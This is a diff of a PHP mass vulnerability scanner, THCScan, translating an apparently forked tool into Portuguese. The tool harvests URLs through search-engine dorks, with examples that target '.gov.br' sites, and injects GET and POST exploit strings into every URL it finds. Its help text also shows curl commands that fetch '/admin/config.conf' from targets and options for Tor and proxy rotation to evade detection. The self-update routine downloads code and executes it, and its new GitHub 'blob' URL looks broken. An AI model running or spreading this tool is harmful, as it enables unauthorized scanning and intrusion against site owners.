@@ -3,15 +3,15 @@
 /*
 
   +-----------------------------------------------------------------------------+
-  |  [!] Aviso Legal: 						                                          		|
-  |  Uso do THCScan - Google Dork					                                    	|
-  |  para atacar alvos sem consentimento prévio mútuo é ilegal.			            |
+  |  [!] Aviso Legal: 								|
+  |  Uso do THCScan - Google Dork						|
+  |  para atacar alvos sem consentimento prévio mútuo é ilegal.			|
   |                                                                             |
   |  É responsabilidade do usuário final obedecer a todas os Leis Locais, Estad-|
-  |  uais e Federais								                                            |
+  |  uais e Federais								|
   |                                                                             |
   |  Os desenvolvedores não assumem nenhuma responsabilidade e não são responsá-|
-  |  veis ​​por qualquer uso indevido ou danos causados ​​por este programa     |
+  |  veis ​​por qualquer uso indevido ou danos causados ​​por este programa         |
   |                                                                             |
   |                             RavokTHC-420                                    |
   +-----------------------------------------------------------------------------+
@@ -24,7 +24,6 @@
 
 
   [+] SCRIPT NAME: THCScan - Google Dork
-  
   O scanner foi desenvolvido por RavokTHC & KarreraTHC.
   Ferramenta desenvolvida em PHP para rodar em diferentes distribuições Linux e Windows
   
@@ -116,18 +115,18 @@ $opcoes = getopt('u::a:d:o:p:s:q:t:m::h::', $commandos_list);
   This function should be called after initializing a cURL session and all the
   options for the session are set.
   http://php.net/manual/en/function.curl-exec.php */
-(!function_exists('curl_exec') ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]} INSTALLING THE LIBRARY php5-curl ex: php5-curl apt-get install{$_SESSION["c0"]}\n") : NULL );
+(!function_exists('curl_exec') ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]} INSTALANDO A LIVRARIA php5-curl ex: php5-curl apt-get install{$_SESSION["c0"]}\n") : NULL );
 
 /*
   [+]VERIFYING use Input PHP CLI.
   (PHP 4, PHP 5) defined — Checks whether a given named constant exists
   http://php.net/manual/pt_BR/function.defined.php */
-(!defined('STDIN') ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]} Please run it through command-line!{$_SESSION["c0"]}\n") : NULL);
+(!defined('STDIN') ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]} Por favor, execute-o através da linha de comando!{$_SESSION["c0"]}\n") : NULL);
 
 
 #[+]Resetting VALUES $ _SESSION ['config']
 $_SESSION['config'] = array();
-$_SESSION['config']['version_script'] = '2.1';
+$_SESSION['config']['version_script'] = '0.4.2.0-1';
 $_SESSION['config']['totas_urls'] = NULL;
 $_SESSION['config']["contUrl"] = 0;
 $_SESSION['config']['cont_email'] = 0;
@@ -198,7 +197,7 @@ if (not_isnull_empty($opcoes['o'])) {
 
     $_SESSION['config']['dork'] = not_isnull_empty($opcoes['dork']) && is_null($_SESSION['config']['abrir-arquivo']) ? $opcoes['dork'] : NULL;
     $_SESSION['config']['dork-file'] = not_isnull_empty($opcoes['dork-file']) && is_null($_SESSION['config']['abrir-arquivo']) ? $opcoes['dork-file'] : NULL;
-    (!not_isnull_empty($_SESSION['config']['dork']) && !not_isnull_empty($_SESSION['config']['dork-file']) ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}DEFINE DORK ex: --dork '.asp?CategoryID=' OR --dork-file 'dorks.txt'{$_SESSION["c0"]}\n") : NULL);
+    (!not_isnull_empty($_SESSION['config']['dork']) && !not_isnull_empty($_SESSION['config']['dork-file']) ? __getOut(__bannerLogo() . "{$_SESSION["c3"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c5"]}DEFINA A DORK ex: --dork '.asp?CategoryID=' OR --dork-file 'dorks.txt'{$_SESSION["c0"]}\n") : NULL);
 }
 
 #[+]VALIDATION GENERATE DORKS RANDOM
@@ -219,7 +218,7 @@ $_SESSION['config']['motor'] = not_isnull_empty($opcoes['q']) &&
 
 #[+]VALIDATION SAVE FILE VULNERABLE
 !not_isnull_empty($opcoes['s']) && !not_isnull_empty($opcoes['save-as']) && empty($opcoes['sall']) ?
-                __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}DEFINE FILE SAVE OUTPUT ex: -s , --save-as , --sall filevull.txt{$_SESSION["c0"]}\n") : NULL;
+                __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}DEFINIR LOCAL DO ARQUIVO ex: -s , --save-as , --sall filevull.txt{$_SESSION["c0"]}\n") : NULL;
 
 $_SESSION['config']['s'] = not_isnull_empty($opcoes['s']) ? $opcoes['s'] : null;
 
@@ -487,29 +486,29 @@ function __update() {
 
     echo __bannerLogo();
 
-    echo "{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}WANT TO MAKE UPDATE SCRIPT\n{$_SESSION["c0"]}";
-    echo "{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}This can modify the current script\n{$_SESSION["c0"]}";
-    echo "{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}ARE YOU SURE ? (y \ n): {$_SESSION["c0"]}";
+    echo "{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}QUER FAZER SCRIPT DE ATUALIZAÇÃO\n{$_SESSION["c0"]}";
+    echo "{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}Isso pode modificar o script atual\n{$_SESSION["c0"]}";
+    echo "{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}VOCÊ TEM CERTEZA? (y \ n): {$_SESSION["c0"]}";
 
     if (trim(fgets(STDIN)) == 'y') {
 
-        $resultado = __request_info("https://raw.githubusercontent.com/googleinurl/SCANNER-INURLBR/master/inurlbr.php", $_SESSION["config"]["proxy"], NULL);
+        $resultado = __request_info("https://github.com/RavokTHC/THCScan/blob/master/THCScan.php", $_SESSION["config"]["proxy"], NULL);
 
         if (not_isnull_empty($resultado['corpo'])) {
 
-            unlink('inurlbr.php');
-            $varf = fopen('inurlbr.php', 'a');
+            unlink('THCScan.php');
+            $varf = fopen('THCScan.php', 'a');
             fwrite($varf, $resultado['corpo']);
             fclose($varf);
-            chmod('inurlbr.php', 0777);
-            echo "\nUPDATE DONE WITH SUCCESS!\n";
+            chmod('THCScan.php', 0777);
+            echo "\nATUALIZAÇÃO FEITA COM SUCESSO!\n";
             sleep(3);
-            system("chmod +x inurlbr.php | php inurlbr.php");
+            system("chmod +x THCScan.php | php THCScan.php");
             exit();
         } else {
 
             echo system("command clear") . __bannerLogo();
-            echo "{$_SESSION["c1"]}__[ x ] {$_SESSION["c16"]}FAILURE TO SERVER!\n{$_SESSION["c0"]}";
+            echo "{$_SESSION["c1"]}__[ x ] {$_SESSION["c16"]}FALHA NO SERVIDOR!\n{$_SESSION["c0"]}";
         }
     }
 }
@@ -537,19 +536,19 @@ function __menu() {
 | |  | | |____| |____| |    
 |_|  |_|______|______|_|
 
-{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current PHP version=>[ {$_SESSION["c1"]}" . phpversion() . "{$_SESSION["c0"]} ]
-{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current script owner=>[ {$_SESSION["c1"]}" . get_current_user() . "{$_SESSION["c0"]} ]
-{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current uname=>[ {$_SESSION["c1"]}" . php_uname() . "{$_SESSION["c0"]} ]
-{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current pwd =>[ {$_SESSION["c1"]}" . getcwd() . "{$_SESSION["c0"]} ]
+{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Versao Atual PHP =>[ {$_SESSION["c1"]}" . phpversion() . "{$_SESSION["c0"]} ]
+{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Desenvolvedor do Script =>[ {$_SESSION["c1"]}" . get_current_user() . "{$_SESSION["c0"]} ]
+{$_SESSION["c1"]}[!]{$_SESSION["c0"]}OS Atual =>[ {$_SESSION["c1"]}" . php_uname() . "{$_SESSION["c0"]} ]
+{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Local Atual =>[ {$_SESSION["c1"]}" . getcwd() . "{$_SESSION["c0"]} ]
 " . $_SESSION['config']['line'] . "
     
 {$_SESSION["c1"]}-h{$_SESSION["c0"]}
-{$_SESSION["c1"]}--help{$_SESSION["c0"]}   Alternative long length help command.
-{$_SESSION["c1"]}--ajuda{$_SESSION["c0"]}  Command to specify Help.
-{$_SESSION["c1"]}--info{$_SESSION["c0"]}   Information script.
-{$_SESSION["c1"]}--update{$_SESSION["c0"]} Code update.    
-{$_SESSION["c1"]}-q{$_SESSION["c0"]}       Choose which search engine you want through [{$_SESSION["c2"]}1...24{$_SESSION["c0"]}] / [{$_SESSION["c2"]}e1..6{$_SESSION["c0"]}]]:
-     [options]:
+{$_SESSION["c1"]}--help{$_SESSION["c0"]}   Comando de ajuda alternativo de longa duração.
+{$_SESSION["c1"]}--ajuda{$_SESSION["c0"]}  Comando para especificar a Ajuda.
+{$_SESSION["c1"]}--info{$_SESSION["c0"]}   Roteiro de informações.
+{$_SESSION["c1"]}--update{$_SESSION["c0"]} Atualização de código.   
+{$_SESSION["c1"]}-q{$_SESSION["c0"]}       Escolha qual mecanismo de pesquisa você deseja [{$_SESSION["c2"]}1...24{$_SESSION["c0"]}] / [{$_SESSION["c2"]}e1..6{$_SESSION["c0"]}]]:
+     [opçoes]:
      {$_SESSION["c1"]}1{$_SESSION["c0"]}   - {$_SESSION["c2"]}GOOGLE / (CSE) GENERIC RANDOM / API
      {$_SESSION["c1"]}2{$_SESSION["c0"]}   - {$_SESSION["c2"]}BING
      {$_SESSION["c1"]}3{$_SESSION["c0"]}   - {$_SESSION["c2"]}YAHOO BR
@@ -575,7 +574,7 @@ function __menu() {
      {$_SESSION["c1"]}23{$_SESSION["c0"]}  - {$_SESSION["c2"]}BOOROW
      {$_SESSION["c1"]}24{$_SESSION["c0"]}  - {$_SESSION["c2"]}GOOGLE(CSE) GENERIC RANDOM
      ----------------------------------------
-                 SPECIAL MOTORS
+	MOTORES ESPECIAIS (SPECIAL MOTORS)
      ----------------------------------------
      {$_SESSION["c1"]}e1{$_SESSION["c0"]}  - {$_SESSION["c2"]}TOR FIND
      {$_SESSION["c1"]}e2{$_SESSION["c0"]}  - {$_SESSION["c2"]}ELEPHANT
@@ -584,83 +583,83 @@ function __menu() {
      {$_SESSION["c1"]}e5{$_SESSION["c0"]}  - {$_SESSION["c2"]}OTN
      {$_SESSION["c1"]}e6{$_SESSION["c0"]}  - {$_SESSION["c2"]}EXPLOITS SHODAN
      ----------------------------------------
-     {$_SESSION["c1"]}all{$_SESSION["c0"]} - {$_SESSION["c2"]}All search engines / not special motors{$_SESSION["c0"]}
-     Default:    {$_SESSION["c1"]}1{$_SESSION["c0"]}
-     Example: {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}1{$_SESSION["c0"]}
+     {$_SESSION["c1"]}all{$_SESSION["c0"]} - {$_SESSION["c2"]}Todos os motores de busca / motores não especiais{$_SESSION["c0"]}
+     Padrao:    {$_SESSION["c1"]}1{$_SESSION["c0"]}
+     Examplo: {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}1{$_SESSION["c0"]}
               {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}5{$_SESSION["c0"]}
-               Using more than one engine:  {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}1,2,5,6,11,24{$_SESSION["c0"]}
-               Using all engines:      {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}all{$_SESSION["c0"]}
+              Usando mais de um mecanismo:  {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}1,2,5,6,11,24{$_SESSION["c0"]}
+               Usando todos os motores:      {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}all{$_SESSION["c0"]}
      
- {$_SESSION["c1"]}--proxy{$_SESSION["c0"]} Choose which proxy you want to use through the search engine:
-     Example: {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}{proxy:port}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}localhost:8118{$_SESSION["c0"]}
+ {$_SESSION["c1"]}--proxy{$_SESSION["c0"]} Escolha qual proxy você deseja usar por meio do mecanismo de pesquisa:
+     Examplo: {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}{proxy:port}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}localhost:8118{$_SESSION["c0"]}
               {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}socks5://googleinurl@localhost:9050{$_SESSION["c0"]}
               {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}http://admin:12334@172.16.0.90:8080{$_SESSION["c0"]}
    
- {$_SESSION["c1"]}--proxy-file{$_SESSION["c0"]} Set font file to randomize your proxy to each search engine.
-     Example: {$_SESSION["c1"]}--proxy-file {$_SESSION["c2"]}{proxys}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--proxy-file {$_SESSION["c2"]}proxys_list.txt{$_SESSION["c0"]}
+ {$_SESSION["c1"]}--proxy-file{$_SESSION["c0"]} Definir arquivo de fonte para randomizar seu proxy para cada mecanismo de pesquisa.
+     Examplo: {$_SESSION["c1"]}--proxy-file {$_SESSION["c2"]}{proxys}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--proxy-file {$_SESSION["c2"]}proxys_list.txt{$_SESSION["c0"]}
 
- {$_SESSION["c1"]}--time-proxy{$_SESSION["c0"]} Set the time how often the proxy will be exchanged.
-     Example: {$_SESSION["c1"]}--time-proxy {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--time-proxy {$_SESSION["c2"]}10{$_SESSION["c0"]}
+ {$_SESSION["c1"]}--time-proxy{$_SESSION["c0"]} Defina a hora com que freqüência o proxy será trocado.
+     Exemplo: {$_SESSION["c1"]}--time-proxy {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--time-proxy {$_SESSION["c2"]}10{$_SESSION["c0"]}
 
- {$_SESSION["c1"]}--proxy-http-file{$_SESSION["c0"]} Set file with urls http proxy, 
-     are used to bular capch search engines
-     Example: {$_SESSION["c1"]}--proxy-http-file {$_SESSION["c2"]}{youfilehttp}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--proxy-http-file {$_SESSION["c2"]}http_proxys.txt{$_SESSION["c0"]}
+ {$_SESSION["c1"]}--proxy-http-file{$_SESSION["c0"]} Definir arquivo com urls http proxy,
+      são usados para motores de busca bular capch
+     Exemplo: {$_SESSION["c1"]}--proxy-http-file {$_SESSION["c2"]}{youfilehttp}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--proxy-http-file {$_SESSION["c2"]}http_proxys.txt{$_SESSION["c0"]}
          
 
- {$_SESSION["c1"]}--tor-random{$_SESSION["c0"]} Enables the TOR function, each usage links an unique IP.
+ {$_SESSION["c1"]}--tor-random{$_SESSION["c0"]} Ativa a função TOR, cada uso vincula um IP exclusivo.
  
- {$_SESSION["c1"]}-t{$_SESSION["c0"]}  Choose the validation type: op {$_SESSION["c2"]}1, 2, 3, 4, 5{$_SESSION["c0"]}
-     [options]:
-     {$_SESSION["c2"]}1{$_SESSION["c0"]}   - The first type uses default errors considering the script:
-     It establishes connection with the exploit through the get method.
-     Demo: www.alvo.com.br/pasta/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
+ {$_SESSION["c1"]}-t{$_SESSION["c0"]}  Escolha o tipo de validação: op{$_SESSION["c2"]}1, 2, 3, 4, 5{$_SESSION["c0"]}
+     [opçoes]:
+     {$_SESSION["c2"]}1{$_SESSION["c0"]}   - TO primeiro tipo usa erros padrão considerando o script:
+      Estabelece conexão com o exploit através do método get.
+     Ex: www.alvo.com.br/pasta/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
    
-     {$_SESSION["c2"]}2{$_SESSION["c0"]}   -  The second type tries to valid the error defined by: {$_SESSION["c1"]}-a={$_SESSION["c2"]}'VALUE_INSIDE_THE _TARGET'{$_SESSION["c0"]}
-     It also establishes connection with the exploit through the get method
-     Demo: www.alvo.com.br/pasta/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
+     {$_SESSION["c2"]}2{$_SESSION["c0"]}   -  O segundo tipo tenta validar o erro definido por: {$_SESSION["c1"]}-a={$_SESSION["c2"]}'VALUE_INSIDE_THE _TARGET'{$_SESSION["c0"]}
+     Também estabelece conexão com a exploração através do método get
+     Ex: www.alvo.com.br/pasta/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
    
-     {$_SESSION["c2"]}3{$_SESSION["c0"]}   - The third type combine both first and second types:
-     Then, of course, it also establishes connection with the exploit through the get method
-     Demo: www.target.com.br{$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
-     Default:    {$_SESSION["c2"]}1{$_SESSION["c0"]}
-     Example: {$_SESSION["c1"]}-t {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}-t {$_SESSION["c2"]}1{$_SESSION["c0"]}
+     {$_SESSION["c2"]}3{$_SESSION["c0"]}   - O terceiro tipo combina os primeiro e segundo tipos:
+      Então, claro, também estabelece conexão com o exploit através do método get
+     Ex: www.target.com.br{$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
+     Padrao:    {$_SESSION["c2"]}1{$_SESSION["c0"]}
+     Exmplo: {$_SESSION["c1"]}-t {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}-t {$_SESSION["c2"]}1{$_SESSION["c0"]}
      
-     {$_SESSION["c2"]}4{$_SESSION["c0"]}   - The fourth type a validation based on source file and will be enabled scanner standard functions.
-     The source file their values are concatenated with target url.
-     - Set your target with command {$_SESSION["c1"]}--target {$_SESSION["c2"]}{http://target}{$_SESSION["c0"]}
-     - Set your file with command {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
-     Explicative:
-     Source file values:
+     {$_SESSION["c2"]}4{$_SESSION["c0"]}   - O quarto tipo uma validação com base no arquivo de origem e será ativado funções padrão do scanner.
+      O arquivo de origem dos seus valores é concatenado com o URL de destino.
+      - Defina o seu alvo com o comando{$_SESSION["c1"]}--target {$_SESSION["c2"]}{http://target}{$_SESSION["c0"]}
+     - Configure seu arquivo com o comando {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
+     Explicaçao:
+     Valores do arquivo de origem:
      /admin/index.php?id=
      /pag/index.php?id=
      /brazil.php?new=
-     Demo: 
+     Ex: 
      www.target.com.br/admin/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
      www.target.com.br/pag/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
      www.target.com.br/brazil.php?new={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
      
-     {$_SESSION["c2"]}5{$_SESSION["c0"]}   - (FIND PAGE) The fifth type of validation based on the source file,
-     Will be enabled only one validation code 200 on the target server, or if the url submit such code will be considered vulnerable.
-     - Set your target with command {$_SESSION["c1"]}--target {$_SESSION["c2"]}{http://target}{$_SESSION["c0"]}
-     - Set your file with command {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
-     Explicative:
-     Source file values:
+     {$_SESSION["c2"]}5{$_SESSION["c0"]}   - (FIND PAGE) O quinto tipo de validação baseado no arquivo de origem,
+      Será ativado apenas um código de validação 200 no servidor de destino, ou se o URL enviar esse código será considerado vulnerável.
+      - Defina o seu alvo com o comando {$_SESSION["c1"]}--target {$_SESSION["c2"]}{http://target}{$_SESSION["c0"]}
+    - Defina seu arquivo com o comando{$_SESSION["c1"]}-o {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
+     Explicaçao:
+     Valores do arquivo de origem:
      /admin/admin.php
      /admin.asp
      /admin.aspx
-     Demo: 
+     Ex: 
      www.target.com.br/admin/admin.php
      www.target.com.br/admin.asp
      www.target.com.br/admin.aspx
-     Observation: If it shows the code 200 will be separated in the output file
+     Observação: Se mostrar que o código 200 será separado no arquivo de saída
 
-     DEFAULT ERRORS:  
+      ERROS PADRÃO:
      {$_SESSION["c11"]}
      [*]JAVA INFINITYDB, [*]LOCAL FILE INCLUSION, [*]ZIMBRA MAIL,           [*]ZEND FRAMEWORK, 
      [*]ERROR MARIADB,   [*]ERROR MYSQL,          [*]ERROR JBOSSWEB,        [*]ERROR MICROSOFT,
@@ -670,307 +669,307 @@ function __menu() {
      [*]ERROR INDEFINITE
      {$_SESSION["c0"]}
          
- {$_SESSION["c1"]}--dork{$_SESSION["c0"]} Defines which dork the search engine will use.
-     Example: {$_SESSION["c1"]}--dork {$_SESSION["c2"]}{dork}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br inurl:php? id'{$_SESSION["c0"]}
-     - Using multiples dorks:
-     Example: {$_SESSION["c1"]}--dork {$_SESSION["c2"]}{[DORK]dork1[DORK]dork2[DORK]dork3}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'{$_SESSION["c0"]}
+ {$_SESSION["c1"]}--dork{$_SESSION["c0"]} Define qual dork o mecanismo de pesquisa usará.
+     Exemplo: {$_SESSION["c1"]}--dork {$_SESSION["c2"]}{dork}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br inurl:php? id'{$_SESSION["c0"]}
+     - Usando multiplas dorks:
+     Examplo: {$_SESSION["c1"]}--dork {$_SESSION["c2"]}{[DORK]dork1[DORK]dork2[DORK]dork3}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'{$_SESSION["c0"]}
  
- {$_SESSION["c1"]}--dork-file{$_SESSION["c0"]} Set font file with your search dorks.
-     Example: {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}{dork_file}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorks.txt'{$_SESSION["c0"]}
+ {$_SESSION["c1"]}--dork-file{$_SESSION["c0"]} Definir arquivo de fonte com seus dorks de pesquisa.
+     Exemplo: {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}{dork_file}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorks.txt'{$_SESSION["c0"]}
 
- {$_SESSION["c1"]}--exploit-get{$_SESSION["c0"]} Defines which exploit will be injected through the GET method to each URL found.
-     Example: {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}{exploit_get}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?'´%270x27;\"{$_SESSION["c0"]}
+ {$_SESSION["c1"]}--exploit-get{$_SESSION["c0"]} Define qual exploit será injetado através do método GET para cada URL encontrada.
+     Exemplo: {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}{exploit_get}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?'´%270x27;\"{$_SESSION["c0"]}
      
- {$_SESSION["c1"]}--exploit-post{$_SESSION["c0"]} Defines which exploit will be injected through the POST method to each URL found.
-     Example: {$_SESSION["c1"]}--exploit-post {$_SESSION["c3"]}{exploit_post}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-post {$_SESSION["c3"]}'field1=valor1&field2=valor2&field3=?´0x273exploit;&botao=ok'{$_SESSION["c0"]}
+ {$_SESSION["c1"]}--exploit-post{$_SESSION["c0"]} Define qual exploit será injetado através do método POST para cada URL encontrada.
+     Exemplo: {$_SESSION["c1"]}--exploit-post {$_SESSION["c3"]}{exploit_post}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--exploit-post {$_SESSION["c3"]}'field1=valor1&field2=valor2&field3=?´0x273exploit;&botao=ok'{$_SESSION["c0"]}
      
- {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]} Defines which exploit/parameter will be executed in the options: {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all{$_SESSION["c0"]}.   
-     The exploit-command will be identified by the paramaters: {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all as {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}      
+ {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]} Define qual exploit / parameter será executado nas opções:{$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all{$_SESSION["c0"]}.   
+    O exploit-command será identificado pelos parâmetros: {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all as {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}      
      Ex {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}'/admin/config.conf' {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'curl -v {$_SESSION["c8"]}_TARGET_{$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c2"]}'{$_SESSION["c0"]}
-     _TARGET_ is the specified URL/TARGET obtained by the process
-     _EXPLOIT_ is the exploit/parameter defined by the option {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]}.
-     Example: {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}{exploit-command}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}'/admin/config.conf'{$_SESSION["c0"]}  
+     _TARGET_ é o URL / TARGET especificado obtido pelo processo
+      _EXPLOIT_ é o exploit / parâmetro definido pela opção {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]}.
+     Exemplo: {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}{exploit-command}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}'/admin/config.conf'{$_SESSION["c0"]}  
      
- {$_SESSION["c1"]}-a{$_SESSION["c0"]}  Specify the string that will be used on the search script:
-     Example: {$_SESSION["c1"]}-a {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}-a {$_SESSION["c2"]}'<title>hello world</title>'{$_SESSION["c0"]}
+ {$_SESSION["c1"]}-a{$_SESSION["c0"]}  Especifique a string que será usada no script de pesquisa:
+     Exemplo: {$_SESSION["c1"]}-a {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}-a {$_SESSION["c2"]}'<title>Bola Mais um Braw!</title>'{$_SESSION["c0"]}
      
- {$_SESSION["c1"]}-d{$_SESSION["c0"]}  Specify the script usage op {$_SESSION["c2"]}1, 2, 3, 4, 5.{$_SESSION["c0"]}
-     Example: {$_SESSION["c1"]}-d {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}-d {$_SESSION["c2"]}1 {$_SESSION["c0"]}/URL of the search engine.
-              {$_SESSION["c1"]}-d {$_SESSION["c2"]}2 {$_SESSION["c0"]}/Show all the url.
-              {$_SESSION["c1"]}-d {$_SESSION["c2"]}3 {$_SESSION["c0"]}/Detailed request of every URL.
-              {$_SESSION["c1"]}-d {$_SESSION["c2"]}4 {$_SESSION["c0"]}/Shows the HTML of every URL.
-              {$_SESSION["c1"]}-d {$_SESSION["c2"]}5 {$_SESSION["c0"]}/Detailed request of all URLs.
-              {$_SESSION["c1"]}-d {$_SESSION["c2"]}6 {$_SESSION["c0"]}/Detailed PING - PONG irc.    
+ {$_SESSION["c1"]}-d{$_SESSION["c0"]}  Especifique o uso do script op {$_SESSION["c2"]}1, 2, 3, 4, 5.{$_SESSION["c0"]}
+     Exemplo: {$_SESSION["c1"]}-d {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}-d {$_SESSION["c2"]}1 {$_SESSION["c0"]}/URL do mecanismo de pesquisa.
+              {$_SESSION["c1"]}-d {$_SESSION["c2"]}2 {$_SESSION["c0"]}/Mostrar todo o URL.
+              {$_SESSION["c1"]}-d {$_SESSION["c2"]}3 {$_SESSION["c0"]}/Solicitação detalhada de cada URL.
+              {$_SESSION["c1"]}-d {$_SESSION["c2"]}4 {$_SESSION["c0"]}/Mostra o HTML de cada URL.
+              {$_SESSION["c1"]}-d {$_SESSION["c2"]}5 {$_SESSION["c0"]}/Solicitação detalhada de todos os URLs.
+              {$_SESSION["c1"]}-d {$_SESSION["c2"]}6 {$_SESSION["c0"]}/PING Detalhado - PONG irc.
              
- {$_SESSION["c1"]}-s{$_SESSION["c0"]}  Specify the output file where it will be saved the vulnerable URLs.
+ {$_SESSION["c1"]}-s{$_SESSION["c0"]}  Especifique o arquivo de saída onde serão salvos os URLs vulneráveis.
      
